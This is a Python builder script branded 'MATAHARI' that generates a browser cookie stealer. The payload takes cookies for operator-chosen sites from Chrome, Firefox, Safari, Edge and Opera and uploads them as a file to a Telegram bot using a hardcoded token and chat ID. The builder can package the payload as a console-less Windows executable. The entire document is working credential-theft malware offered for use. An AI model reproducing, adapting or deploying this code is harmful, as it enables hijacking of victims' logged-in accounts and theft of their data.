import os

print("""
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   MATA    `98v8P'  HARI    `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                               
            ███╗   ███╗ █████╗ ████████╗ █████╗ ██╗  ██╗ █████╗ ██████╗ ██╗
	    ████╗ ████║██╔══██╗╚══██╔══╝██╔══██╗██║  ██║██╔══██╗██╔══██╗██║
	    ██╔████╔██║███████║   ██║   ███████║███████║███████║██████╔╝██║
	    ██║╚██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██╔══██║██╔══██╗██║
	    ██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║  ██║██║  ██║██║
            ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝

                                                    Coded by Connec V1.0
""")
token = input("[*]Telegram Bot Token: ")
chat_id = input("[*]Telegram Chat ID: ")
domains = input("[*]Domains (instagram,twitter,mail.google): ")
domain_list = domains.split(",")
file_format = input("[*]exe or py?: ")
file_name = input("[*]File name: ")


payload = """
import browser_cookie3
import requests

all_cookies = ('')
cookie_input_list = COOKIESLIST

def Cookie_Stealer(cookie_input):

    def ChromeCookies():
        def getCookiesFromChrome(domain,cookieName=''):

            Cookies={\}
            chromeCookies = list(browser_cookie3.chrome())

            for cookie in chromeCookies:

                if (domain in cookie.domain):
                    Cookies[cookie.name]=cookie.value

            if(cookieName!=''):
                try:
                    return Cookies[cookieName] 
                except:
                    return {} 
            else:
                return Cookies
        try:   
            cookie = getCookiesFromChrome(cookie_input)
        except:
            cookie = 'NONE'
        return cookie


    def FireFoxCookies():
        def getCookiesFromFirefox(domain,cookieName=''):

            Cookies={}
            firefoxCookies = list(browser_cookie3.firefox())

            for cookie in firefoxCookies:

                if (domain in cookie.domain):
                    Cookies[cookie.name]=cookie.value

            if(cookieName!=''):
                try:
                    return Cookies[cookieName] 
                except:
                    return {} 
            else:
                return Cookies

        try:   
            cookie = getCookiesFromFirefox(cookie_input)
        except:
            cookie = 'NONE'

        return cookie


    def SafariCookies():
        def getCookiesFromSafari(domain,cookieName=''):

            Cookies={}
            safariCookies = list(browser_cookie3.safari())

            for cookie in safariCookies:

                if (domain in cookie.domain):
                    Cookies[cookie.name]=cookie.value

            if(cookieName!=''):
                try:
                    return Cookies[cookieName] 
                except:
                    return {} 
            else:
                return Cookies

        try:   
            cookie = getCookiesFromSafari(cookie_input)
        except:
            cookie = 'NONE'

        return cookie


    def EdgeCookies():
        def getCookiesFromEdge(domain,cookieName=''):

            Cookies={}
            edgeCookies = list(browser_cookie3.edge())

            for cookie in edgeCookies:

                if (domain in cookie.domain):
                    Cookies[cookie.name]=cookie.value

            if(cookieName!=''):
                try:
                    return Cookies[cookieName] 
                except:
                    return {} 
            else:
                return Cookies
  
        try:   
            cookie = getCookiesFromEdge(cookie_input)
        except:
            cookie = 'NONE'

        return cookie



    def OperaCookies():
        def getCookiesFromOpera(domain,cookieName=''):

            Cookies={}
            operaCookies = list(browser_cookie3.opera())

            for cookie in operaCookies:

                if (domain in cookie.domain):
                    Cookies[cookie.name]=cookie.value

            if(cookieName!=''):
                try:
                    return Cookies[cookieName] 
                except:
                    return {} 
            else:
                return Cookies

        try:   
            cookie = getCookiesFromOpera(cookie_input)
        except:
            cookie = 'NONE'

        return cookie



    chrome_cookies = ChromeCookies()
    firefox_cookies = FireFoxCookies()
    safari_cookies = SafariCookies()
    edge_cookies = EdgeCookies()
    opera_cookies = OperaCookies()

    return '''
*****************************************************************

Chrome {\} Cookies:

{}

*****************************************************************
    
Firefox {} Cookies:

{}

*****************************************************************

Safari {} Cookies:

{}

*****************************************************************

Edge {} Cookies:

{}

*****************************************************************

Opera {} Cookies:

{}

*****************************************************************
'''.format(cookie_input,chrome_cookies,cookie_input,firefox_cookies,cookie_input,safari_cookies,cookie_input,edge_cookies,cookie_input,opera_cookies)

for i in cookie_input_list:
    all_cookies += Cookie_Stealer(i) 

def Send_Cookies():
    with open('cookies.txt','w') as file:
      file.write(all_cookies)
    cookie_file = open('cookies.txt','rb')
    requests.post(url='https://api.telegram.org/bot5545032153:AAEym1FM3lXkkBkS0ZkeSaDx7qTZ1IEg58A/sendDocument',data={'chat_id':'5354760889'},files={'document': cookie_file})
    cookie_file.close()
    os.remove('cookies.txt')

Send_Cookies()
"""
payload = payload.replace("\\","")
payload = payload.replace("COOKIESLIST",str(domain_list))
payload = payload.replace("TELEGRAMTOKEN",token)
payload = payload.replace("TELEGRAMCHATID",chat_id)


if (file_format == "py"):
    with open(str(file_name) + ".py","w") as file:
        file.write(payload)
elif (file_format== "exe"):
    with open(str(file_name) + ".py","w") as file:
        file.write(payload)
    os.system("python -m PyInstaller --onefile --noconsole " + str(file_name) + ".py")
    os.remove(str(file_name) + ".py")
else:
    print("Invalid choice.")
